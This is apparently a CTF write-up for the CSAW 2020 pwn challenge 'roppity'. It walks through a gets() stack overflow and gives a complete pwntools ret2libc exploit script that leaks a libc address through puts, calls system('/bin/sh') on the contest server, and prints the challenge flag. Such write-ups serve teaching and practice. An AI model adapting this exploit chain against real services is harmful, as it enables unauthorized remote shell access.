# Table of Contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Points](#Challenge-Points)
6. [Attachments](#Attachments)
7. [Challenge Description](#Challenge-Description)
8. [Solution](#Solution)

# Author
0x534b

# CTF
CSAW CTF Quals 2020

# Category
Pwn

# Challenge Name
roppity

# Challenge Points
50 pts

# Challenge Description
Welcome to pwn!

`nc pwn.chal.csaw.io 5016`

# Attachments

## rop

```
rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5d177aa372f308c07c8daaddec53df7c5aafd630, not stripped
```

ghidra pseudocode:
```c
int main(EVP_PKEY_CTX *param_1)
{
  char local_28 [32];
  
  init(param_1);
  puts("Hello");
  gets(local_28);
  return 0;
}
```

## libc-2.27.so
```
libc-2.27.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d3cf764b2f97ac3efe366ddd07ad902fb6928fd7, for GNU/Linux 3.2.0, stripped
```

# Solution
## The Program:
By running the provided binary we see it prints `"Hello"`, takes an input, then exits. Ghidra's pseudocode shows that the program uses `puts()` for output and `gets()` to take input.

## Vulnerabilities:
If we check the manpage for `gets()`, we see:
```
Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue  to  store characters past the end of the buffer, it is extremely dangerous to use.
```
This vulnerability allows an attacker to overwrite values on the stack, most notably the calling function's return address, to redirect the flow of execution.

## The Exploit:
In theory, we can overwrite the return address with a call to the `system()` function in libc to get a shell. We can use python to give the program a really long input to check that we can overwrite the return pointer:
```
python3 -c 'print("A"*200)' | ./rop

Hello
[1]    27966 done                python3 -c 'print("A"*500)' |
       27967 segmentation fault  ./rop
```
We got a segfault! Running this in gdb we can see that the program is trying to return to 0x4141414141414141 (AAAAAAAA):
```
0x400611 <main+53>    ret    <0x4141414141414141>
```
To find out how long our input needs to be to reach the return address, we could just use trial and error, or we could use `cyclic` from the `pwntools` library for python (specifying a subsequence length of 8 for 64-bit qwords):
```
cyclic -n 8 200 | ./rop
```
In gdb we can check our new return address:
```
0x400611 <main+53>    ret    <0x6161616161616166>
```
We can look this value up in our cyclic output like this (remembering to reverse the string with `[::-1]` because the address is little-endian):
```
cyclic -n 8 -l `python3 -c 'print("\x61\x61\x61\x61\x61\x61\x61\x66"[::-1])'

40
```
Cool! Now we know that we can jump to whatever address we want just by inputting 40 characters/bytes of input followed by an address. Well, it turns out that, because of ASLR, libc is loaded into a different address in memory each time we run the program. This means that the address of `system()`, being in libc, will also be at a different address each time. So what *can* we jump to? Running `checksec` on the binary (which comes with `pwntools`) tells us that the binary has PIE disabled:
```
checksec ./rop

[*] '/ctfs/csaw20/roppity/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
This means that any addresses built into the main binary are static, including the PLT and GOT. Since the program uses the `puts()` function (rather conspicuously), we should be able to call it from the PLT to print out libc addresses from the GOT! From there, we can calculate the libc base address, and from that, the address of `system()`. However, we run into one last roadblock: the program only takes input once. How will we use the leaked libc address? Well, we can just add the address of `main()` onto the end of our ropchain, then input a second payload once it calls `gets()` for a second time. The final exploit script (generated with help from `pwntools`'s `pwn template`) looks like this:

```python
#!/usr/bin/env python3
# This exploit template was generated via:
# $ pwn template ./rop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rop')
host = 'pwn.chal.csaw.io'
port = 5016

def local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        p = process([exe.path] + argv, *a, **kw)
        # print the process's pid to attach a debugger
        print(p.pid)
        input()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(host, port)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

pop_rdi = 0x0000000000400683
ret = 0x000000000040048e
offset = 40
# load the provided libc
libc = ELF('./libc-2.27.so')

# start the program/connect
io = start()

# recieve "Hello"
io.recvuntil(b'\n')

pl = b'A'*offset
# pop our argument so we return to puts@plt and not __libc_start_main@got
pl += p64(pop_rdi)
# supply __libc_start_main@got as an argument to puts to print its libc address
pl += p64(exe.got['__libc_start_main'])
pl += p64(exe.plt['puts'])
# return to main to take a second input
pl += p64(exe.symbols['main'])

# send the payload
io.sendline(pl)

# receive the leaked libc address
res = io.recvuntil(b'\n')[:-1]
leak = u64(res.ljust(8, b'\x00'))

# calculate the libc base address
libc.address = leak - libc.sym['__libc_start_main']

# get the addresses of system() and a "/bin/sh" string in libc
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym['system']

# receive "Hello" again
io.recv()

pl2 = b'A'*offset
# pop our argument so we return to system() and not the "/bin/sh" string
pl2 += p64(pop_rdi)
# supply the "/bin/sh" string as an argument to system()
pl2 += p64(binsh)
# use a ret ropgadget to pad the stack so the "/bin/sh" string is in the right place for system()
pl2 += p64(ret)
# return to system()
pl2 += p64(system)

# send the second payload
io.sendline(pl2)

# change to interactive mode to use the shell
io.interactive()
```
We run it and...
```
[*] '/ctfs/csaw20/roppity/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/ctfs/csaw20/roppity/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.chal.csaw.io on port 5016: Done
[*] Switching to interactive mode
$ ls
flag.txt
rop
```
We have a shell! Lets read that `flag.txt` file:
```
$ cat ./flag.txt
flag{r0p_4ft3r_r0p_4ft3R_r0p}
```
